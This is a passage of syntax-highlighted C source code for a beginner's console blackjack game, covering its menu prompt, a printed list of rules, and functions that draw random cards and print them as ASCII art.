comment" spellcheck="true">// Function for asking player if they want to continue</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> choice1<span class="token punctuation">;</span>    <span class="token keyword">int</span> choice2<span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                 Are You Ready?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                ----------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                      (Y/N)\n                        "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"\n%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>    <span class="token punctuation">{</span>                                                                                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If yes, continue. Prints menu.</span>    <span class="token punctuation">{</span>             <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter 1 to Begin the Greatest Game Ever Played."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter 2 to See a Complete Listing of Rules."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter 3 to Exit Game. (Not Recommended)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nChoice: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Prompts user for choice</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice2<span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice2<span class="token operator">></span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>            <span class="token punctuation">{</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nIncorrect Choice. Please enter 1, 2 or 3\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice2<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">switch</span><span class="token punctuation">(</span>choice2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Switch case for different choices</span>            <span class="token punctuation">{</span>                   <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">// Case to begin game</span>                   <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">// Case to see rules</span>                   <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">rules</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">// Case to exit game</span>                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYour day could have been perfect."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nHave an almost perfect day!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">default</span><span class="token punctuation">:</span>                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nInvalid Input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End switch case</span>    <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End if loop</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If no, exit program</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYour day could have been perfect."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nHave an almost perfect day!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End function</span><span class="token keyword">void</span> <span class="token function">rules</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Prints "Rules of Vlad's Blackjack" list</span><span class="token punctuation">{</span>     <span class="token keyword">char</span> choice1<span class="token punctuation">;</span>     <span class="token keyword">int</span> choice2<span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n           RULES of VLAD's BLACKJACK"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n          ---------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nI."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     Thou shalt not question the odds of this game."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c This program generates cards at random."</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c If you keep losing, you are very unlucky!\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nII."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     Each card has a value."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c Number cards 1 to 10 hold a value of their number."</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c J, Q, and K cards hold a value of 10."</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c Ace cards hold a value of 11"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     The goal of this game is to reach a card value total of 21.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nIII."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     After the dealing of the first two cards, YOU must decide whether to HIT or STAY."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c Staying will keep you safe, hitting will add a card."</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     Because you are competing against the dealer, you must beat his hand."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     BUT BEWARE!."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c If your total goes over 21, you will LOSE!."</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     But the world is not over, because you can always play again.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c%c%c YOUR RESULTS ARE RECORDED AND FOUND IN SAME FOLDER AS PROGRAM %c%c%c\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWould you like to go the previous screen? (I will not take NO for an answer)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                  (Y/N)\n                    "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"\n%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>    <span class="token punctuation">{</span>                                                                                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If yes, continue. Prints menu.</span>    <span class="token punctuation">{</span>             <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End if loop</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If no, convinces user to enter yes</span>    <span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                 I told you so.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End function</span><span class="token keyword">int</span> <span class="token function">clubcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Displays Club Card Image</span><span class="token punctuation">{</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>    k<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 9 or less, print card with that number</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Club Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  %d  |\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 10, print card with J (Jack) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Club Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  J  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11, print card with A (Ace) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Club Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  A  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is Ace, change value to 11 or 1 depending on dealer total</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 12, print card with Q (Queen) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Club Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  Q  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 13, print card with K (King) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Club Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  K  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> k<span class="token punctuation">;</span>           <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// End function</span><span class="token keyword">int</span> <span class="token function">diamondcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Displays Diamond Card Image</span><span class="token punctuation">{</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>    k<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 9 or less, print card with that number</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Diamond Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  %d  |\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 10, print card with J (Jack) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Diamond Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  J  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11, print card with A (Ace) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Diamond Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  A  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is Ace, change value to 11 or 1 depending on dealer total</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 12, print card with Q (Queen) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Diamond Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  Q  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 13, print card with K (King) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Diamond Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  K  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> k<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// End function</span><span class="token keyword">int</span> <span class="token function">heartcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Displays Heart Card Image</span><span class="token punctuation">{</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>    k<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token 